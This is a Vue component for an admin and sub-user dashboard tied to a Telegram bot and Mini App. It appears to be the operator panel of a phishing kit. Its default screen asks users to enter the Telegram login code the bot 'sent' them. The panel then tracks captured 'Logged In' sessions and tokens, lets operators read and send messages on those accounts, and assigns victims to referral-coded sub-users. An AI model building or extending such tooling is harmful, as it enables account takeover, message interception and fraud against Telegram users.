<script setup>
import { ref, onMounted } from "vue";
import { api } from "../api/client";

const isAuthenticated = ref(false);
const role = ref("admin"); // admin | sub_user
const profile = ref(null);
const activeTab = ref("users"); // users | sync | subusers | settings

// Login form
const loginUsername = ref("admin");
const loginPassword = ref("");
const loginError = ref("");
const loggingIn = ref(false);

// Data
const users = ref([]);
const subUsers = ref([]);
const stats = ref({ totalUsers: 0, activeSessions: 0, totalMessages: 0 });
const webhookUrl = ref(`${window.location.origin}/api/webhook`);
const statusNotice = ref("");

// Sub-user creation form
const newSub = ref({
  name: "",
  username: "",
  password: "",
  ref_code: "",
});

// Message Sync state
const selectedUser = ref(null);
const syncedMessages = ref([]);
const replyText = ref("");
const syncingChat = ref(false);

// Template editor
const tplForm = ref({
  color: "default",
  codeTitle: "Auto OTP Verification",
  codeDesc: "Our bot automatically sent a 6-digit login code to your Telegram chat. Enter it below.",
  codeBtn: "Verify & Login",
});

async function handleLogin() {
  loginError.value = "";
  loggingIn.value = true;
  try {
    const res = await api.adminLogin({
      username: loginUsername.value.trim(),
      password: loginPassword.value,
    });
    if (res.ok && res.token) {
      localStorage.setItem("tg_admin_token", res.token);
      isAuthenticated.value = true;
      role.value = res.role;
      profile.value = res.profile;
      await loadOverview();
    }
  } catch (e) {
    loginError.value = e.message;
  } finally {
    loggingIn.value = false;
  }
}

function handleAdminLogout() {
  localStorage.removeItem("tg_admin_token");
  isAuthenticated.value = false;
}

async function loadOverview() {
  try {
    const res = await api.adminOverview({});
    if (res.ok) {
      isAuthenticated.value = true;
      role.value = res.role;
      profile.value = res.profile;
      users.value = res.users || [];
      subUsers.value = res.sub_users || [];
      stats.value = res.stats || stats.value;
      if (res.template) {
        tplForm.value.color = res.template.color || "default";
        tplForm.value.codeTitle = res.template.code?.title || tplForm.value.codeTitle;
        tplForm.value.codeDesc = res.template.code?.description || tplForm.value.codeDesc;
        tplForm.value.codeBtn = res.template.code?.buttonText || tplForm.value.codeBtn;
      }
    }
  } catch {
    isAuthenticated.value = false;
  }
}

async function createSubUser() {
  if (!newSub.value.name || !newSub.value.username || !newSub.value.password) {
    statusNotice.value = "Fill name, username, and password for sub-user.";
    return;
  }
  try {
    const res = await api.adminCreateSubUser(newSub.value);
    if (res.ok) {
      newSub.value = { name: "", username: "", password: "", ref_code: "" };
      statusNotice.value = "Sub-user created successfully!";
      await loadOverview();
    }
  } catch (e) {
    statusNotice.value = e.message;
  }
}

async function toggleSubUser(sub) {
  await api.adminToggleSubUser({ id: sub.id, is_active: sub.is_active ? 0 : 1 });
  await loadOverview();
}

async function deleteSubUser(id) {
  await api.adminDeleteSubUser({ id });
  await loadOverview();
}

async function assignUserToSub(tgId, subUserRef) {
  await api.adminAssignUser({ tg_id: tgId, sub_user_ref: subUserRef });
  statusNotice.value = "User assignment updated.";
  await loadOverview();
}

async function revokeSession(tgId) {
  await api.adminRevokeSession({ tg_id: tgId });
  statusNotice.value = "Session revoked.";
  await loadOverview();
}

async function openMessageSync(user) {
  selectedUser.value = user;
  activeTab.value = "sync";
  await refreshUserMessages();
}

async function refreshUserMessages() {
  if (!selectedUser.value) return;
  syncingChat.value = true;
  try {
    const res = await api.adminGetMessages({ tg_id: selectedUser.value.tg_id });
    if (res.ok) {
      syncedMessages.value = res.messages || [];
    }
  } finally {
    syncingChat.value = false;
  }
}

async function sendAdminReply() {
  if (!selectedUser.value || !replyText.value.trim()) return;
  const text = replyText.value.trim();
  replyText.value = "";
  await api.adminSendMessage({
    tg_id: selectedUser.value.tg_id,
    text,
  });
  await refreshUserMessages();
}

async function saveTemplate() {
  await api.adminSaveTemplate({
    color: tplForm.value.color,
    code: {
      title: tplForm.value.codeTitle,
      description: tplForm.value.codeDesc,
      buttonText: tplForm.value.codeBtn,
    },
  });
  statusNotice.value = "Mini App template saved!";
}

async function setupBotWebhook() {
  try {
    const res = await api.adminSetupWebhook({ webhook_url: webhookUrl.value });
    statusNotice.value = res.message || "Telegram Webhook connected!";
  } catch (e) {
    statusNotice.value = e.message;
  }
}

onMounted(() => {
  if (localStorage.getItem("tg_admin_token")) {
    loadOverview();
  }
});
</script>

<template>
  <div class="admin-shell">
    <!-- LOGIN SCREEN -->
    <div v-if="!isAuthenticated" class="login-box">
      <h2>Admin & Sub-User Control Panel</h2>
      <p>Sign in as Super Admin or Sub-User to manage sessions and sync messages.</p>

      <label>Username</label>
      <input v-model="loginUsername" type="text" placeholder="admin or sub-user username" />

      <label>Password / Admin Secret</label>
      <input
        v-model="loginPassword"
        type="password"
        placeholder="Enter ADMIN_SECRET or sub-user password"
        @keyup.enter="handleLogin"
      />

      <p v-if="loginError" class="err">{{ loginError }}</p>
      <button class="btn-primary" :disabled="loggingIn" @click="handleLogin">
        {{ loggingIn ? "Signing in..." : "Sign In" }}
      </button>
    </div>

    <!-- DASHBOARD SCREEN -->
    <div v-else class="dashboard">
      <header class="topbar">
        <div>
          <h2>Control Panel</h2>
          <span class="role-badge">
            {{ role === "admin" ? "Super Admin" : `Sub-User: ${profile?.name} (${profile?.ref_code})` }}
          </span>
        </div>
        <button class="btn-danger-sm" @click="handleAdminLogout">Logout</button>
      </header>

      <div v-if="statusNotice" class="notice-bar" @click="statusNotice = ''">
        {{ statusNotice }} (click to dismiss)
      </div>

      <!-- STATS -->
      <div class="stats-grid">
        <div class="stat-card">
          <span>Total Users</span>
          <strong>{{ stats.totalUsers }}</strong>
        </div>
        <div class="stat-card">
          <span>Active Sessions</span>
          <strong class="green">{{ stats.activeSessions }}</strong>
        </div>
        <div class="stat-card">
          <span>Synced Messages</span>
          <strong>{{ stats.totalMessages }}</strong>
        </div>
      </div>

      <!-- TABS -->
      <nav class="tabs">
        <button :class="{ active: activeTab === 'users' }" @click="activeTab = 'users'">
          Users & Sessions
        </button>
        <button :class="{ active: activeTab === 'sync' }" @click="activeTab = 'sync'">
          Message Sync
        </button>
        <button
          v-if="role === 'admin'"
          :class="{ active: activeTab === 'subusers' }"
          @click="activeTab = 'subusers'"
        >
          Sub-Users
        </button>
        <button
          v-if="role === 'admin'"
          :class="{ active: activeTab === 'settings' }"
          @click="activeTab = 'settings'"
        >
          Bot & Settings
        </button>
      </nav>

      <!-- TAB 1: USERS & SESSIONS -->
      <section v-if="activeTab === 'users'" class="panel">
        <div class="panel-head">
          <h3>Connected Users ({{ users.length }})</h3>
          <button class="btn-secondary-sm" @click="loadOverview">↻ Refresh</button>
        </div>

        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>User</th>
                <th>Status / Session</th>
                <th>Sub-User</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="u in users" :key="u.id">
                <td>
                  <strong>{{ u.first_name }} {{ u.last_name }}</strong>
                  <div class="sub-text">@{{ u.username || "no_username" }} • {{ u.tg_id }}</div>
                </td>
                <td>
                  <span :class="['pill', u.state === 'end' ? 'pill-ok' : 'pill-wait']">
                    {{ u.state === "end" ? "Logged In" : u.state }}
                  </span>
                  <div v-if="u.session_token" class="sub-text">
                    Token: {{ u.session_token.slice(0, 10) }}...
                  </div>
                </td>
                <td>
                  <select
                    v-if="role === 'admin'"
                    :value="u.sub_user_ref || ''"
                    @change="assignUserToSub(u.tg_id, $event.target.value)"
                  >
                    <option value="">Unassigned (Admin)</option>
                    <option v-for="s in subUsers" :key="s.id" :value="s.ref_code">
                      {{ s.name }} ({{ s.ref_code }})
                    </option>
                  </select>
                  <span v-else>{{ u.sub_user_ref || "Default" }}</span>
                </td>
                <td class="actions-cell">
                  <button class="btn-sync" @click="openMessageSync(u)">Sync Messages</button>
                  <button
                    v-if="u.state === 'end'"
                    class="btn-revoke"
                    @click="revokeSession(u.tg_id)"
                  >
                    Revoke
                  </button>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- TAB 2: MESSAGE SYNC -->
      <section v-if="activeTab === 'sync'" class="panel">
        <div class="sync-layout">
          <aside class="user-sidebar">
            <h4>Logged-In Users</h4>
            <div
              v-for="u in users"
              :key="u.id"
              :class="['user-item', selectedUser?.tg_id === u.tg_id ? 'selected' : '']"
              @click="openMessageSync(u)"
            >
              <div>
                <strong>{{ u.first_name }}</strong>
                <span :class="['dot', u.state === 'end' ? 'on' : 'off']" />
              </div>
              <small>{{ u.tg_id }}</small>
            </div>
          </aside>

          <div class="sync-chat-area">
            <template v-if="selectedUser">
              <div class="chat-bar">
                <div>
                  <strong>{{ selectedUser.first_name }}</strong> ({{ selectedUser.tg_id }})
                  <span class="pill pill-ok" v-if="selectedUser.state === 'end'">Session Active</span>
                  <span class="pill pill-wait" v-else>Not Logged In Yet</span>
                </div>
                <button class="btn-secondary-sm" @click="refreshUserMessages">
                  {{ syncingChat ? "Syncing..." : "↻ Sync Now" }}
                </button>
              </div>

              <div class="messages-box">
                <p v-if="!syncedMessages.length" class="empty-msg">
                  No synced messages for this user yet.
                </p>
                <div
                  v-for="m in syncedMessages"
                  :key="m.id"
                  :class="['bubble', m.sender_type === 'user' ? 'from-user' : 'from-admin']"
                >
                  <div class="b-head">
                    {{ m.sender_name || m.sender_type }} • {{ m.source }} • {{ m.created_at }}
                  </div>
                  <div>{{ m.message_text }}</div>
                </div>
              </div>

              <div class="reply-box">
                <input
                  v-model="replyText"
                  type="text"
                  placeholder="Send message to user (delivers to Telegram Bot & Mini App)..."
                  @keyup.enter="sendAdminReply"
                />
                <button class="btn-primary-sm" @click="sendAdminReply">Send & Sync</button>
              </div>
            </template>
            <div v-else class="empty-msg">
              Select a user from the left list to sync and view their messages.
            </div>
          </div>
        </div>
      </section>

      <!-- TAB 3: SUB-USERS (SUPER ADMIN ONLY) -->
      <section v-if="activeTab === 'subusers' && role === 'admin'" class="panel">
        <h3>Create New Sub-User</h3>
        <div class="sub-form">
          <input v-model="newSub.name" placeholder="Display Name (e.g. Agent Rahim)" />
          <input v-model="newSub.username" placeholder="Login Username" />
          <input v-model="newSub.password" type="password" placeholder="Login Password" />
          <input v-model="newSub.ref_code" placeholder="Ref Code (e.g. rahim01)" />
          <button class="btn-primary-sm" @click="createSubUser">+ Create Sub-User</button>
        </div>

        <h3>Sub-Users List</h3>
        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>Name</th>
                <th>Username</th>
                <th>Ref Code / Start Param</th>
                <th>Status</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="s in subUsers" :key="s.id">
                <td><strong>{{ s.name }}</strong></td>
                <td>{{ s.username }}</td>
                <td><code>sub_{{ s.ref_code }}</code></td>
                <td>
                  <span :class="['pill', s.is_active ? 'pill-ok' : 'pill-wait']">
                    {{ s.is_active ? "Active" : "Disabled" }}
                  </span>
                </td>
                <td class="actions-cell">
                  <button class="btn-secondary-sm" @click="toggleSubUser(s)">
                    {{ s.is_active ? "Disable" : "Enable" }}
                  </button>
                  <button class="btn-revoke" @click="deleteSubUser(s.id)">Delete</button>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- TAB 4: BOT WEBHOOK & TEMPLATE SETTINGS -->
      <section v-if="activeTab === 'settings' && role === 'admin'" class="panel">
        <h3>1. Telegram Bot Auto-Sync Webhook</h3>
        <p class="hint-text">
          Connect your bot webhook so user messages sent to the bot automatically sync into this Admin Panel.
        </p>
        <div class="inline-form">
          <input v-model="webhookUrl" type="text" />
          <button class="btn-primary-sm" @click="setupBotWebhook">Activate Bot Webhook</button>
        </div>

        <h3 style="margin-top: 24px">2. Mini App OTP Screen Customization</h3>
        <div class="tpl-grid">
          <label>Theme Color</label>
          <select v-model="tplForm.color">
            <option value="default">Telegram Default</option>
            <option value="dark">Dark Mode</option>
            <option value="blue">Royal Blue</option>
            <option value="green">Emerald Green</option>
          </select>

          <label>OTP Screen Title</label>
          <input v-model="tplForm.codeTitle" />

          <label>OTP Screen Description</label>
          <input v-model="tplForm.codeDesc" />

          <label>Verify Button Text</label>
          <input v-model="tplForm.codeBtn" />

          <button class="btn-primary-sm" @click="saveTemplate">Save Template</button>
        </div>
      </section>
    </div>
  </div>
</template>

<style scoped>
.admin-shell {
  min-height: 100vh;
  background: #f1f5f9;
  color: #0f172a;
  padding: 20px;
}
.login-box {
  max-width: 400px;
  margin: 60px auto;
  background: #fff;
  padding: 28px;
  border-radius: 16px;
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.06);
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.login-box input,
.panel input,
.panel select {
  padding: 10px 12px;
  border: 1px solid #cbd5e1;
  border-radius: 8px;
  font-size: 14px;
}
.btn-primary {
  padding: 12px;
  border: 0;
  border-radius: 10px;
  background: #2563eb;
  color: #fff;
  font-weight: 600;
  cursor: pointer;
  margin-top: 6px;
}
.dashboard {
  max-width: 1100px;
  margin: 0 auto;
}
.topbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
}
.topbar h2 {
  margin: 0 0 4px;
}
.role-badge {
  background: #dbeafe;
  color: #1d4ed8;
  padding: 4px 10px;
  border-radius: 999px;
  font-size: 12px;
  font-weight: 600;
}
.notice-bar {
  background: #dcfce7;
  color: #166534;
  padding: 10px 14px;
  border-radius: 10px;
  margin-bottom: 14px;
  font-size: 13px;
  cursor: pointer;
}
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 12px;
  margin-bottom: 18px;
}
.stat-card {
  background: #fff;
  padding: 16px;
  border-radius: 12px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
}
.stat-card span {
  font-size: 12.5px;
  color: #64748b;
  display: block;
}
.stat-card strong {
  font-size: 24px;
  margin-top: 4px;
  display: block;
}
.stat-card strong.green {
  color: #059669;
}
.tabs {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;
  margin-bottom: 16px;
}
.tabs button {
  padding: 9px 16px;
  border: 1px solid #cbd5e1;
  background: #fff;
  border-radius: 10px;
  font-weight: 600;
  cursor: pointer;
}
.tabs button.active {
  background: #0f172a;
  color: #fff;
  border-color: #0f172a;
}
.panel {
  background: #fff;
  padding: 20px;
  border-radius: 16px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.04);
}
.panel-head {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 12px;
}
.table-wrap {
  overflow-x: auto;
}
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 13.5px;
}
th,
td {
  text-align: left;
  padding: 10px 8px;
  border-bottom: 1px solid #e2e8f0;
}
.sub-text {
  font-size: 11.5px;
  color: #64748b;
}
.pill {
  padding: 3px 8px;
  border-radius: 999px;
  font-size: 11.5px;
  font-weight: 600;
}
.pill-ok {
  background: #dcfce7;
  color: #166534;
}
.pill-wait {
  background: #fef3c7;
  color: #92400e;
}
.actions-cell {
  display: flex;
  gap: 6px;
}
.btn-sync {
  background: #2563eb;
  color: #fff;
  border: 0;
  padding: 6px 10px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 12px;
}
.btn-revoke,
.btn-danger-sm {
  background: #ef4444;
  color: #fff;
  border: 0;
  padding: 6px 10px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 12px;
}
.btn-primary-sm {
  background: #2563eb;
  color: #fff;
  border: 0;
  padding: 9px 14px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 600;
}
.btn-secondary-sm {
  background: #e2e8f0;
  color: #0f172a;
  border: 0;
  padding: 6px 10px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 12px;
}
.sync-layout {
  display: grid;
  grid-template-columns: 240px 1fr;
  gap: 16px;
  min-height: 400px;
}
@media (max-width: 720px) {
  .sync-layout {
    grid-template-columns: 1fr;
  }
}
.user-sidebar {
  border-right: 1px solid #e2e8f0;
  padding-right: 12px;
}
.user-item {
  padding: 10px;
  border-radius: 10px;
  cursor: pointer;
  margin-bottom: 6px;
  border: 1px solid #e2e8f0;
}
.user-item.selected {
  background: #eff6ff;
  border-color: #2563eb;
}
.dot {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  margin-left: 6px;
}
.dot.on {
  background: #10b981;
}
.dot.off {
  background: #f59e0b;
}
.sync-chat-area {
  display: flex;
  flex-direction: column;
}
.chat-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-bottom: 10px;
  border-bottom: 1px solid #e2e8f0;
}
.messages-box {
  flex: 1;
  min-height: 250px;
  max-height: 340px;
  overflow-y: auto;
  padding: 12px 0;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.bubble {
  padding: 10px 12px;
  border-radius: 10px;
  max-width: 80%;
  font-size: 13.5px;
}
.bubble.from-user {
  background: #f1f5f9;
  align-self: flex-start;
}
.bubble.from-admin {
  background: #2563eb;
  color: #fff;
  align-self: flex-end;
}
.b-head {
  font-size: 10.5px;
  opacity: 0.75;
  margin-bottom: 3px;
}
.reply-box {
  display: flex;
  gap: 8px;
  margin-top: 8px;
}
.reply-box input {
  flex: 1;
}
.sub-form {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
  gap: 10px;
  margin-bottom: 20px;
}
.inline-form {
  display: flex;
  gap: 8px;
}
.inline-form input {
  flex: 1;
}
.tpl-grid {
  display: flex;
  flex-direction: column;
  gap: 8px;
  max-width: 500px;
}
.err {
  color: #dc2626;
  font-size: 13px;
}
.empty-msg {
  text-align: center;
  color: #64748b;
  padding: 40px 0;
}
</style>
